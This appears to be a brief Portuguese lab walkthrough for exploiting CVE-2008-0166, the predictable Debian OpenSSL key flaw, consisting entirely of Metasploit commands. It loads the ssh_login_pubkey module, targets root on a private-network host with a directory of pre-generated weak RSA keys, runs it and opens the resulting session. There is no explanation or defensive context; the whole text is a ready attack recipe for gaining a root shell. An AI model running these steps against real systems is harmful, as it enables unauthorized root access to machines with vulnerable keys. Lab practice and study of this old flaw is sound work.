# Exploração da CVE-2008-0166

## Inicialização

```bash
msfconsole
````

---

# Módulo utilizado

```bash
use auxiliary/scanner/ssh/ssh_login_pubkey
```

---

# Configuração

```bash
set RHOST 192.168.56.101
set USERNAME root
set VERBOSE true
set KEY_PATH /home/kali/rsa/2048/
```

---

# Execução

```bash
run
```

---

# Interação com a sessão

```bash
sessions -i 1
```

````
